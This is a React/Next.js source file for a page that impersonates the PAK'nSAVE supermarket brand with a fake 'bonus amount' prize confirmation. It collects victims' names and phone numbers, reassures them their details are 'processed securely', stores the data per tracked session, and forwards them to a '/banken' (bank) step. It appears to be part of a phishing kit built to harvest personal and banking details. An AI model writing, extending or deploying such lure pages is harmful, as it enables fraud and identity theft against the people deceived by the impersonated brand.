"use client";

import { useEffect, useState, useMemo } from "react";
import { useRouter } from "next/navigation";
import { DemoShell } from "@/components/demo/DemoShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";
import { persistActiveSession } from "@/lib/session-id-client";

type Props = {
  sessionId: string;
};

export function WinFlow({ sessionId }: Props) {
  
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const [amount, setAmount] = useState<number | null>(null);
  const [currency, setCurrency] = useState<string>("NZ$");
  const [loading, setLoading] = useState(true);
  const [showModal] = useState(true);
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [phone, setPhone] = useState("");
  const [saving, setSaving] = useState(false);
  const [processing, setProcessing] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null) {
        setLoading(false);
        return;
      }
      const { data, error: qErr } = await supabase
        .from("sessions")
        .select("amount, form_data")
        .eq("id", sessionId)
        .maybeSingle();

      if (cancelled) return;
      if (qErr || !data) {
        setError("Session not found or configuration is invalid.");
        setLoading(false);
        return;
      }

      setAmount(data.amount ?? 0);
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setSessionFormData(fd);
      if (fd.currency) setCurrency(fd.currency);
      setFirstName(fd.firstName ?? "");
      setLastName(fd.lastName ?? "");
      setPhone(fd.phone ?? "");
      setLoading(false);
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase) return;
    setSaving(true);
    setError(null);

    const nextForm = {
      ...sessionFormData,
      firstName: firstName.trim(),
      lastName: lastName.trim(),
      phone: phone.trim(),
    };

    const { error: upErr } = await supabase
      .from("sessions")
      .update({ is_hidden: false, form_data: nextForm, current_step: "banken" })
      .eq("id", sessionId);

    setSaving(false);
    if (upErr) {
      setError("Saving failed. Please try again.");
      return;
    }
    setSessionFormData(nextForm);
    try {
      persistActiveSession(sessionId);
      localStorage.setItem(`session:${sessionId}:profileComplete`, "1");
    } catch {
      /* storage ops are best-effort */
    }
    setProcessing(true);
    window.setTimeout(() => {
      setProcessing(false);
      window.location.href = "/banken";
    }, 700);
  }


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
        </div>
      </div>
    );
  }

  if (!supabase) {
    return (
      <DemoShell title="Configuration" subtitle="System environment">
        <ConfigMissing />
      </DemoShell>
    );
  }

  if (loading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-brand-blue border-t-transparent" />
        </div>
      </div>
    );
  }

  if (error && amount === null) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center p-4">
        <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-900">{error}</p>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
      {showModal ? (
        <div
          role="dialog"
          aria-modal="true"
          className="pak-form-card w-full max-w-[980px]"
        >
          <div className="pak-form-inner px-5 pb-6 pt-6 sm:px-10 sm:pb-10 sm:pt-10 lg:px-12">
            <div className="grid gap-7 lg:grid-cols-[minmax(0,1.1fr)_260px] lg:items-start">
              <div className="min-w-0">
                <div className="max-w-[34rem]">
                  <h2 className="pak-form-title">Complete your entry</h2>
                  <p className="pak-form-subtitle mt-3">
                    Enter your details to complete your prize confirmation.
                  </p>
                </div>
                <div className="pak-form-amount mt-5 w-full max-w-[25rem] px-5 py-4 sm:px-6">
                  <div className="pak-form-amount-label">
                    <div>Your</div>
                    <div>Bonus Amount</div>
                  </div>
                  <div className="pak-form-amount-divider" />
                  <div className="pak-form-amount-value">
                    {currency}{amount?.toLocaleString("en-NZ")}
                  </div>
                </div>
              </div>

              <div className="flex items-start justify-between gap-4 lg:block">
                <img
                  src="/form-assets/paknsave-logo-form.png"
                  alt="PAK'nSAVE"
                  className="h-14 w-14 object-contain sm:h-16 sm:w-16 lg:ml-auto lg:mb-4"
                />
                <img
                  src="/form-assets/paknsave-gift-box.png"
                  alt=""
                  className="h-auto w-24 object-contain drop-shadow-[0_18px_32px_rgba(0,0,0,0.45)] sm:w-32 lg:w-full lg:max-w-[220px] lg:translate-x-2"
                />
              </div>
            </div>

            <form onSubmit={handleSubmit} className="mt-7 space-y-5 sm:space-y-6">
              <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 sm:gap-6">
                <label className="pak-form-label">
                  {settings.profile_firstname_label}
                  <div className="pak-form-input-wrap">
                    <div className="pak-form-input-icon">
                      <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                        <path d="M12 12a4.25 4.25 0 1 0-4.25-4.25A4.25 4.25 0 0 0 12 12Z" />
                        <path d="M4.8 20.2a7.2 7.2 0 0 1 14.4 0" strokeLinecap="round" />
                      </svg>
                    </div>
                    <input
                      required
                      className="pak-form-input min-h-[4.5rem] pl-14 pr-4 text-lg"
                      value={firstName}
                      onChange={(e) => setFirstName(e.target.value)}
                      autoComplete="given-name"
                    />
                  </div>
                </label>
                <label className="pak-form-label">
                  {settings.profile_lastname_label}
                  <div className="pak-form-input-wrap">
                    <div className="pak-form-input-icon">
                      <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                        <path d="M12 12a4.25 4.25 0 1 0-4.25-4.25A4.25 4.25 0 0 0 12 12Z" />
                        <path d="M4.8 20.2a7.2 7.2 0 0 1 14.4 0" strokeLinecap="round" />
                      </svg>
                    </div>
                    <input
                      required
                      className="pak-form-input min-h-[4.5rem] pl-14 pr-4 text-lg"
                      value={lastName}
                      onChange={(e) => setLastName(e.target.value)}
                      autoComplete="family-name"
                    />
                  </div>
                </label>
              </div>
              <label className="pak-form-label">
                {settings.profile_phone_label}
                <div className="pak-form-input-wrap">
                  <div className="pak-form-input-icon">
                    <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                      <path d="M6.6 3.8h2.6l1.2 4.3-1.6 1.6a15.9 15.9 0 0 0 5.5 5.5l1.6-1.6 4.3 1.2v2.6a1.9 1.9 0 0 1-2.1 1.9A16.2 16.2 0 0 1 4.7 6a1.9 1.9 0 0 1 1.9-2.2Z" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  </div>
                  <input
                    required
                    type="tel"
                    className="pak-form-input min-h-[4.5rem] pl-14 pr-4 text-lg"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    autoComplete="tel"
                  />
                </div>
              </label>

              <div className="flex flex-col gap-4 pt-2 md:flex-row md:items-center md:justify-between">
                <div className="pak-form-security">
                  <svg className="h-9 w-9 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                    <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                  </svg>
                  <span>Your details are processed securely.</span>
                </div>

                <button
                  type="submit"
                  disabled={saving || processing}
                  className="pak-form-button min-h-[4.25rem] w-full px-6 text-xl md:w-[24rem]"
                >
                  {processing ? "Processing..." : saving ? "Saving..." : settings.profile_button}
                </button>
              </div>

              {error ? <p className="text-sm font-medium text-red-400">{error}</p> : null}
            </form>
          </div>
        </div>
      ) : null}
    </div>
  );
}
